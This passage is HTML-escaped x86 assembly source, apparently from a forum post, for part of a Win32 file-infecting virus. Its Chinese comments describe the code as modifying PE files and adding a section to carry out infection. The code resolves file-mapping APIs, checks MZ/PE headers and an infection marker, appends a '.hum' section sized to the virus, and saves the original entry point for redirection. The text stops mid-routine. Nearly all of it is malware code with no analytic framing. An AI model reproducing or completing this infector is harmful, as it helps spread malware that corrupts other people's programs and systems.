&lt;P&gt;u32&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "User32.dll",0 &lt;BR&gt;k32&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "Kernel32.dll",0 &lt;/P&gt;
&lt;P&gt;appBase&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;k32Base&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;;-----------------------------------------apis needed &lt;/P&gt;
&lt;P&gt;lpApiAddrs&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; label&amp;nbsp; near &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sGetModuleHandle &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sGetProcAddress &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sLoadLibrary &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sCreateFile &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sCreateFileMapping &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sMapViewOfFile &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sUnmapViewOfFile &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sCloseHandle &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sGetFileSize &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sSetEndOfFile &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sSetFilePointer &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; offset sExitProcess &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0,0 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/P&gt;
&lt;P&gt;sGetModuleHandle&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "GetModuleHandleA",0 &lt;BR&gt;sGetProcAddress&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "GetProcAddress",0 &lt;BR&gt;sLoadLibrary&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "LoadLibraryA",0 &lt;BR&gt;sCreateFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "CreateFileA",0 &lt;BR&gt;sCreateFileMapping&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "CreateFileMappingA",0 &lt;BR&gt;sMapViewOfFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "MapViewOfFile",0 &lt;BR&gt;sUnmapViewOfFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "UnmapViewOfFile",0 &lt;BR&gt;sCloseHandle&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "CloseHandle",0 &lt;BR&gt;sGetFileSize&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "GetFileSize",0 &lt;BR&gt;sSetFilePointer&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "SetFilePointer",0 &lt;BR&gt;sSetEndOfFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "SetEndOfFile",0 &lt;/P&gt;
&lt;P&gt;sExitProcess&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "ExitProcess",0 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&lt;/P&gt;
&lt;P&gt;aGetModuleHandle&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aGetProcAddress&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aLoadLibrary&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aCreateFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aCreateFileMapping&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aMapViewOfFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aUnmapViewOfFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aCloseHandle&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aGetFileSize&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aSetFilePointer&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;aSetEndOfFile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;/P&gt;
&lt;P&gt;aExitProcess&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;BR&gt;;----------------------------------------- &lt;BR&gt;;;========================modipe.asm================= &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;修改pe,添加节,实现传染功能 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xchg&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,esi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; word&amp;nbsp; ptr [esi],'ZM' &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jne&amp;nbsp;&amp;nbsp;&amp;nbsp; CouldNotInfect &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,[esi+3ch]&amp;nbsp; ;指向PE_HEADER &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; word&amp;nbsp; ptr [esi],'EP' &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jne&amp;nbsp;&amp;nbsp;&amp;nbsp; CouldNotInfect&amp;nbsp; ;是否是PE,否则不感染 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi+8],'dark' &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CouldNotInfect &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+pe_Header],esi&amp;nbsp; ;保存pe_Header指针 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[esi+74h]&amp;nbsp; ;得到directory的数目 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; imul&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,ecx,8 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ecx+esi+78h]&amp;nbsp; ;data directory&amp;nbsp; eax-&amp;gt;节表起始地址 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; movzx&amp;nbsp; ecx,word&amp;nbsp; ptr [esi+6h]&amp;nbsp; ;节数目 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; imul&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,ecx,28h&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;得到所有节表的大小 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ecx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;节结尾... &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xchg&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,esi&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;eax-&amp;gt;Pe_header,esi-&amp;gt;最后节开始偏移 &lt;/P&gt;
&lt;P&gt;;;************************** &lt;BR&gt;;;添加如下结构: &lt;BR&gt;;;name .hum &lt;BR&gt;;;VirtualSize==原size+VirSize &lt;BR&gt;;;VirtualAddress= &lt;BR&gt;;;SizeOfRawData 对齐 &lt;BR&gt;;;PointerToRawData &lt;BR&gt;;;PointerToRelocations dd 0 &lt;BR&gt;;;PointerToLinenumbers dd ?&amp;nbsp;&amp;nbsp; &lt;BR&gt;;;NumberOfRelocations dw&amp;nbsp; ?&amp;nbsp;&amp;nbsp; &lt;BR&gt;;;NumberOfLinenumbers dw&amp;nbsp; ? &lt;BR&gt;;;Characteristics&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;;;************************** &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi],'muh.'&amp;nbsp; ;节名.hum &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi+8],VirusLen ;实际大小&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;计算VirtualSize和V.addr &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,[eax+38h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;SectionAlignment &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+sec_align],ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[eax+3ch]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;file align &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+file_align],edi&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[esi-40+0ch]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;上一节的V.addr&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[esi-40+8]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;上一节的实际大小&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; div&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;除以节对齐 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; test&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp; @@@1 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;@@@1: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mul&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;对齐后的节大小 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ecx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;加上V.addr就是新节的起始V.addr &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [esi+0ch],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;保存新section偏移RVA &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,__Start-vBegin &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+newEip],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;计算新的eip&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi+24h],0E0000020h&amp;nbsp;&amp;nbsp;&amp;nbsp; ;属性&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,VirusLen&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;计算SizeOfRawData的大小 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cdq &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; div&amp;nbsp;&amp;nbsp;&amp;nbsp; edi&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;节的文件对齐 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; @@@2 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;@@@2: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mul&amp;nbsp;&amp;nbsp;&amp;nbsp; edi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi+10h],eax ;保存节对齐文件的大小&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[esi-40+14h] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[esi-40+10h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [esi+14h],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;PointerToRawData更新&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+oldEnd],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;&lt;/P&gt;
&lt;P&gt;最后文件增加到...? &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebp+pe_Header] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; word&amp;nbsp; ptr [eax+6h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;更新节数目 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,[eax+28h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;eip指针偏移 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+oldEip],ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;保存老指针 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 